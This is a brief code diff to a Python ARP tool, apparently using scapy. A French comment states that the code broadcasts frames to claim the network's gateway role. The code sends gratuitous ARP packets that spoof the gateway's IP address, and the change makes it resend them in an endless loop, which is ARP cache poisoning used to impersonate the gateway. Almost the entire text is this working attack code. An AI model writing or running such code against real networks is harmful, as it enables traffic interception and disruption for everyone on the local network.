@@ -28,8 +28,9 @@ class ArpGratuitous:
         # On envoie une trame à l'ensemble du réseau pour indiquer que l'on fait office de passerelle
         packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", psrc=self.gateway, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff:ff")
 
-        sendp(packet)
-        time.sleep(self.interval)
+        while True:
+            sendp(packet)
+            time.sleep(self.interval)
 
 
 if __name__ == "__main__":
